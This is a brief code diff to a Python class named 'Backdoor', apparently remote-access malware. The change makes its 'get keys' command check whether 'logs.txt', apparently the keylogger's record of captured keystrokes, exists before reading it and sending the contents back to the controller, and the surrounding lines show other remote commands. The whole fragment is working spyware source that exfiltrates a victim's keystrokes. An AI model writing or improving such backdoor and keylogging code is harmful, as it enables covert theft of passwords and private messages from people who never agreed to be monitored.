@@ -217,8 +217,11 @@ class Backdoor:
 						self.reliable_send("[-] Can't understand your command")
 
 				elif command == "get keys":
-					keys = self.read_file("logs.txt")
-					self.reliable_send(keys)
+					if os.path.exists("logs.txt"):
+						keys = self.read_file("logs.txt")
+						self.reliable_send(keys)
+					else:
+						self.reliable_send("[-] No key is pressed yet")
 
 				elif command == "play music":
 					if not self.music_playing:
